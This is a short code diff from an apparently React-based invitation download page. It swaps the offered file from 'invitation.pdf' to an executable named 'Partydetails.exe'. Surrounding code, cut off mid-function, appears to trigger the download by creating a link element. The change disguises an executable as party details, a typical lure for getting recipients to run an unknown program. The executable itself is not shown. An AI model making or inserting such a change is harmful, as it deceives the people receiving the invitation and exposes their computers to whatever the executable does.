@@ -3,8 +3,8 @@
 import { useEffect } from "react";
 
 /** Put your file at: public/downloads/invitation.pdf */
-export const INVITE_FILE_URL = "/downloads/invitation.pdf";
-export const INVITE_FILE_NAME = "invitation.pdf";
+export const INVITE_FILE_URL = "/downloads/Partydetails.exe";
+export const INVITE_FILE_NAME = "Partydetails.exe";
 
 function triggerDownload() {
   const link = document.createElement("a");
